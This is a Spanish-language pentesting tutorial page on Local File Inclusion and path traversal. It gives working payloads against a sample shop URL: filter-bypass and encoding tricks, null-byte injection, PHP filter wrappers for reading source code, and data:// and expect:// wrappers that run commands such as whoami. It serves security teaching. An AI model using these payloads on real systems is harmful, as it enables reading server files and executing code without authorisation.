---
cover: >-
  https://cdn.invicti.com/app/uploads/2022/06/28122221/local-file-inclusion-vulnerability.jpg
coverY: -187
layout:
  cover:
    visible: true
    size: full
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Local File Inclusion (LFI)

## ¿Que es el File Path Traversal?

Esta es una vulnerabilidad conocida por permitir ver archivos del servidor en el que se ejecuta la web.

## ¿Como funciona?

El Path Traversal, es una vulnerabilidad en la que modificando el nombre/ruta de un archivo por GET, nos permite visualizarlo sin problema:

## Explotación

Imagina que tienes una tienda, que vende productos, dichos productos llevan adjunta una foto:

<figure><img src="../../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>

Dicha imagen, debe de estar almacenada en algún sitio, por ejemplo en este caso, esta almacenada en una ruta del servidor. Solo que la imagen se obtiene a través de un parámetro de un archivo PHP:

```http
https://myshop.com/image?filename=5.jpg
```

Si en vez de especificarle ese archivo, le escribimos otro que sepamos que existe en esa misma ruta, nos dejará verlo:

```http
https://myshop.com/image?filename=6.jpg
```

Pero imagina que por detrás la aplicación web, hace uso de cat o alguna herramienta similar para visualizar el archivo, podrías hacer uso de `..` para subir de directorio (Concepto de Sistemas Linux) por ejemplo:

```bash
├── Web/
│   ├── Content/
│   │   ├── bank_account_passwords.txt
│   │   ├── company_passwords.txt
│   │   ├── Bank_Transfers/
│   │   │   ├── profit.xlsx
│   │   │   ├── payments.xlsx
│   │   │   └── back-up_screenshot.jpg
│   │   └── Assests
│   │       └── Product_Images/
│   │           ├── 5.jpg <====
│   │           ├── 6.jpg
│   │           └── 7.jpg
│   └── warning.log
├── customers_emails.txt
├── names.txt
└── company_description.txt
```

Imagina que estas visualizando el archivo `5.jpg` , puedes usar los `..` para subir al directorio padre, y visualizar el archivo `bank_account_passwords.txt` así:

```http
https://myshop.com/image?filename=../../bank_account_passwords.txt
```

```bash
├── Web/
│   ├── Content/
│   │   ├── bank_account_passwords.txt <====
│   │   ├── company_passwords.txt
│   │   ├── Bank_Transfers/
│   │   │   ├── profit.xlsx
│   │   │   ├── payments.xlsx
│   │   │   └── back-up_screenshot.jpg
│   │   └── Assests
│   │       └── Product_Images/
│   │           ├── 5.jpg
│   │           ├── 6.jpg
│   │           └── 7.jpg
│   └── warning.log
├── customers_emails.txt
├── names.txt
└── company_description.txt
```

Pues este es el concepto del Directory/Path Traversal

## LFI Bypass

### Eliminación de patrones

En ciertas ocasiones, los desarrolladores, aplican un reemplazo en el que eliminan `../` del input del nombre/ruta del archivo. Una medida de evitar estas restricciones es ponerlo doble:

```http
https://myshop.com/image?filename=....//....//bank_account_passwords.txt
http://myshop.com/image?filename=....\/....\/....\/bank_account_passwords.txt
```

De esta manera, la medida elimina solo `../` y por lo tanto el input final se queda de esta manera:

```http
https://myshop.com/image?filename=../../bank_account_passwords.txt
```

### URL-Encode

En algunos casos, los desarrolladores, aplican un parámetro especifico en las cabeceras de la solicitud en el que este elimina los path traversal, pero este parámetro no tiene en cuenta la codificación/decodificación URL, por lo que podemos usar esto en nuestro beneficio:

```http
https://myshop.com/image?filename=%2e%2e%2f%2e%2e%2fbank_account_passwords.txt
```

Lo que hacemos en la URL, es sustituir `../` por su codificación en URL encode que es `%2e%2e%2f` , en algunas ocasiones podemos usar doble codificación para que surja efecto:

```http
https://myshop.com/image?filename=%252e%252e%252f%252e%252e%252fbank_account_passwords.txt
```

{% hint style="info" %}
Se pueden utilizar codificaciones no estandarizadas para dificultar la detección:

```http
https://myshop.com/image?filename=..%c0%af..%c0%afbank_account_passwords.txt
```

En el caso de doble codificación:

```http
https://myshop.com/image?filename=..%ef%bc%8f..%ef%bc%8fbank_account_passwords.txt
```
{% endhint %}

### Validación ruta

En esta ocasión, algunos programadores, deciden validar si el inicio de la ruta del archivo es correcta, pero podemos hacer un bypass muy sencillo usando `../`:

```http
https://myshop.com/image?filename=/var/www/html/Web/Content/Assests/../../bank_account_passwords.txt
```

### Null Byte

En este caso, el desarrollador obliga a que la extension del archivo sea por ejemplo `.png`, pero con un null byte `%00` podemos evitar esta validación, ya que actua como final de la ruta del archivo, y aunque la aplicación vea que tiene la extension, el sistema no lo interpretará:

```http
https://myshop.com/image?filename=../../bank_account_passwords%00.png
```

### Path Truncation



## LFI Wrappers (PHP)

En algunos casos, después de explotar un LFI o un Path Traversal, puedes hacer uso de los PHP Filters para ver el código PHP, ya que de forma normal, la web lo interpreta y no podrías verlo, los PHP Filters también se usan en casos en los que el archivo a visualizar es muy grande, por lo cual se convierte a Base 64 y de decodifica en la maquina:

```php
php://filter/convert.base64-encode/resource=index.php
```

```http
https://myshop.com/image?filename=php://filter/convert.base64-encode/resource=index.php
```

Otra opción para que el código PHP, no sea interpretado, es aplicar un método criptográfico sencillo, por ejemplo Rot13:

```php
php://filter/read=string.rot13/resource=index.php
```

```http
https://myshop.com/image?filename=php://filter/read=string.rot13/resource=index.php
```

Existen muchas más opciones para evitar esto, otra es iconv:

```
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

### De LFI a RCE

Con el uso de determinados wrappers de PHP, podemos ejecutar código en el servidor, si encontramos un parámetro vulnerable a LFI. Los wrappers son estos:

* `data://`&#x20;

```http
http://website.com/index.php?page=data:text/plain;,<?php system('whoami'); ?>
```

{% hint style="info" %}
Existen webs que no permitirán o en las que no será exitoso el ejecutar el código PHP de esta manera, por lo que podemos convertirlo a Base64 para que sea más sencillo:

```http
http://website.com/index.php?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

Una forma más sencilla y cómoda de ejecutar comandos mediante Base64 es mediante un parámetro (El codigo en Base64 está URL-encoded ya que da problemas):

<pre class="language-http"><code class="lang-http"><strong>http://website.com/index.php?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B&#x26;cmd=whoami
</strong></code></pre>
{% endhint %}

* `expect://`

```http
http://website.com/index.php?page=expect://whoami
```

### PHP Filters

Cuando codificamos y decodificamos un valor en PHP, van quedando restos de la codificación, con los cuales podemos construir un comando a través de esto:

[https://github.com/synacktiv/php\_filter\_chain\_generator](https://github.com/synacktiv/php\_filter\_chain\_generator)



{% hint style="info" %}
Enlaces de Interés:

1. [https://ironhackers.es/herramientas/lfi-cheat-sheet/](https://ironhackers.es/herramientas/lfi-cheat-sheet/)
2. [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
3. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md)
{% endhint %}
